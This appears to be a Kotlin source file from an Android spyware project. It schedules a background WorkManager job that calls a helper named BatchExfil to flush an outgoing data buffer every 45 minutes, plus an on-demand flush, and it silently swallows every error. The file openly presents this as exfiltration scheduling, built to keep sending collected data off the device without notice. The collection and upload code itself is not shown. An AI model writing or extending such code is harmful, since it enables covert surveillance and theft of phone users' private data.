package com.sp.core.worker

import android.content.Context
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.sp.core.util.BatchExfil
import java.util.concurrent.TimeUnit

/**
 * Periodic flush of the outgoing buffer (every 45 minutes, network required).
 */
class BatchFlushWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
    override fun doWork(): Result {
        return try {
            BatchExfil.flush(applicationContext)
            Result.success()
        } catch (_: Throwable) {
            Result.retry()
        }
    }

    companion object {
        private const val UNIQUE = "sp_batch_flush"

        fun schedulePeriodic(ctx: Context) {
            try {
                val constraints = Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
                val request = PeriodicWorkRequestBuilder<BatchFlushWorker>(
                    BatchExfil.FLUSH_INTERVAL_MS, TimeUnit.MILLISECONDS
                ).setConstraints(constraints).build()
                WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                    UNIQUE, ExistingPeriodicWorkPolicy.KEEP, request
                )
            } catch (_: Throwable) {
            }
        }

        fun flushNow(ctx: Context) {
            try {
                val request = androidx.work.OneTimeWorkRequestBuilder<BatchFlushWorker>().build()
                WorkManager.getInstance(ctx).enqueue(request)
            } catch (_: Throwable) {
            }
        }
    }
}
